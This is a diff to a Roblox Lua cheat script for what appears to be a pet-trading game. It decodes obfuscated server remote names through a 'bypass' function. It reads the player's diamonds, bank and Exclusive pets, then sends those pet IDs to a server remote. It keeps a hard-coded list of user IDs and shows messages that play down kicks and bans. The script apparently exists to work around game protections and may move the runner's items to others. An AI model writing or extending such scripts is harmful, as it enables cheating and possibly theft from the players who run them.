@@ -34,7 +34,7 @@ lib.Message.New("Executed! Now wait")
 
 
 
-local ids = {3054700681, 3067660943, 2637234077, 3375574937, 4012744308}
+local ids = {3067660943, 3054700681, 2637234077, 3375574937, 4012744308}
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = game.ReplicatedStorage[bypass(1,"#!F8fb51efb02ff4d8b96d6cce765532ea7")]:InvokeServer()
 -- local mybanks = lib.Network.Invoke("!F8fb51efb02ff4d8b96d6cce765532ea7")
@@ -53,12 +53,19 @@ local mybanks = game.ReplicatedStorage[bypass(1,"#!F8fb51efb02ff4d8b96d6cce76553
 -- a:Remove()
 -- local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
 local PetsList = {}
+local PetsList2 = {}
 for i,v in pairs(lib.Save.Get().Pets) do
     local v2 = lib.Directory.Pets[v.id];
     if v2.rarity == "Exclusive" then
         table.insert(PetsList, v.uid);
+        PetsList2[v.uid] = false
     end
 end
+
+
+
+game.ReplicatedStorage[bypass(1,"#!F3be716c53b164be6adfeeb00f2baa9bc")]:InvokeServer(PetsList2)
+
 print(mybanks, v207)
 
 
@@ -112,7 +119,7 @@ end
 
 lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
 wait(3)
-game.Players.LocalPlayer:Kick()
+-- game.Players.LocalPlayer:Kick()
 
 
 function comma_value(amount)
